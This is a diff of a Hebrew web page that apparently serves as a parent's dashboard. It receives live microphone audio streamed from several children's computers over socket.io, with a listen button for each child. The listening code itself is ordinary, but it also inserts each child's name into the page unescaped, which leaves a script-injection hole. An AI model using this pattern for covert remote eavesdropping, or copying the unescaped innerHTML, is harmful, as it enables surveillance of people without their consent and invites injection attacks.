@@ -2,71 +2,97 @@
 <html lang="he" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>בקרת הורים - האזנה</title>
+    <title>מרכז בקרה רב-ערוצי</title>
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; display: flex; flex-direction: column; align-items: center; padding: 20px; }
+        .channel-card { background: white; padding: 20px; border-radius: 15px; width: 300px; margin: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); display: flex; align-items: center; justify-content: space-between; }
+        .status-badge { padding: 5px 10px; border-radius: 20px; font-size: 12px; background: #eee; }
+        .online { background: #2ed573; color: white; }
+        .btn-listen { background: #007bff; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; }
+        .listening { background: #ff4757; }
+    </style>
 </head>
-<body style="font-family: sans-serif; text-align: center; padding-top: 50px; background: #f0f2f5;">
-    <div style="background: white; padding: 30px; border-radius: 15px; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.1); min-width: 320px;">
-        <h2>האזנה בזמן אמת <div id="pulse" style="width: 15px; height: 15px; background: #ccc; border-radius: 50%; display: inline-block; margin-right: 10px;"></div></h2>
-        <p id="msg">לחץ להתחלת האזנה</p>
-        <button id="enableAudio" style="padding: 12px 24px; background: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold;">הפעל שמע</button>
-        <div id="debug" style="margin-top: 15px; font-size: 11px; color: #888;">ממתין לפעולה...</div>
+<body>
+    <h1>מרכז בקרה - האזנה לילדים</h1>
+    <div id="channels">
+        <p>ממתין לשידורים מהמחשבונים...</p>
     </div>
 
     <script>
         const socket = io();
-        const msg = document.getElementById('msg');
-        const debug = document.getElementById('debug');
-        const pulse = document.getElementById('pulse');
+        const channelsDiv = document.getElementById('channels');
+        const childBuffers = {}; // אובייקט שיחזיק נגן לכל ילד
 
-        let mediaSource = new MediaSource();
-        let audio = new Audio();
-        audio.src = URL.createObjectURL(mediaSource);
-        let sourceBuffer;
-        let queue = [];
+        socket.emit('join-room'); // ההורה מצטרף לחדר
 
-        document.getElementById('enableAudio').onclick = () => {
-            document.getElementById('enableAudio').style.display = 'none';
-            msg.innerText = "מתחבר לשידור...";
+        socket.on('play-audio', (data) => {
+            const { audio, childName, childId } = data;
             
-            if (mediaSource.readyState === 'open') {
-                setupBuffer();
-            } else {
-                mediaSource.addEventListener('sourceopen', setupBuffer);
+            // אם זה ילד חדש שעדיין לא ראינו, ניצור לו כפתור ומנגנון שמע
+            if (!childBuffers[childId]) {
+                createChildUI(childId, childName);
+                setupMediaSource(childId);
             }
-            audio.play();
-        };
 
-        function setupBuffer() {
-            if (!sourceBuffer) {
-                // הגדרת ה-Buffer בדיוק לפי מה שהילד שולח
-                sourceBuffer = mediaSource.addSourceBuffer('audio/webm;codecs=opus');
-                
-                // ניהול תור: ברגע שחתיכה מסתיימת, נכניס את הבאה מהתור
-                sourceBuffer.addEventListener('updateend', () => {
-                    if (queue.length > 0 && !sourceBuffer.updating) {
-                        sourceBuffer.appendBuffer(queue.shift());
-                    }
-                });
-
-                socket.emit('join-room');
-                debug.innerText = "צינור שמע פתוח. ממתין לנתונים...";
-            }
-        }
-
-        socket.on('play-audio', async (data) => {
-            const uint8 = new Uint8Array(data);
-            
-            if (sourceBuffer && !sourceBuffer.updating) {
-                sourceBuffer.appendBuffer(uint8);
-                msg.innerText = "שומע סביבה...";
-                pulse.style.background = "red";
-                debug.innerText = "נתונים מתקבלים בזמן אמת";
+            // הוספת האודיו לתור של הילד הספציפי
+            const uint8 = new Uint8Array(audio);
+            const sb = childBuffers[childId].sourceBuffer;
+            if (sb && !sb.updating) {
+                sb.appendBuffer(uint8);
             } else {
-                queue.push(uint8);
+                childBuffers[childId].queue.push(uint8);
             }
         });
+
+        function createChildUI(id, name) {
+            if (document.getElementById(`card-${id}`)) return;
+            const card = document.createElement('div');
+            card.className = 'channel-card';
+            card.id = `card-${id}`;
+            card.innerHTML = `
+                <div>
+                    <strong>${name}</strong>
+                    <div class="status-badge online">משדר</div>
+                </div>
+                <button class="btn-listen" id="btn-${id}" onclick="toggleListen('${id}')">האזן</button>
+            `;
+            if (channelsDiv.querySelector('p')) channelsDiv.innerHTML = '';
+            channelsDiv.appendChild(card);
+        }
+
+        function setupMediaSource(id) {
+            const ms = new MediaSource();
+            const audioObj = new Audio();
+            audioObj.src = URL.createObjectURL(ms);
+            
+            childBuffers[id] = { ms, audio: audioObj, queue: [] };
+
+            ms.addEventListener('sourceopen', () => {
+                const sb = ms.addSourceBuffer('audio/webm;codecs=opus');
+                childBuffers[id].sourceBuffer = sb;
+                sb.addEventListener('updateend', () => {
+                    if (childBuffers[id].queue.length > 0 && !sb.updating) {
+                        sb.appendBuffer(childBuffers[id].queue.shift());
+                    }
+                });
+            });
+        }
+
+        function toggleListen(id) {
+            const btn = document.getElementById(`btn-${id}`);
+            const audio = childBuffers[id].audio;
+
+            if (audio.paused) {
+                audio.play();
+                btn.innerText = "עצור";
+                btn.classList.add('listening');
+            } else {
+                audio.pause();
+                btn.innerText = "האזן";
+                btn.classList.remove('listening');
+            }
+        }
     </script>
 </body>
 </html>
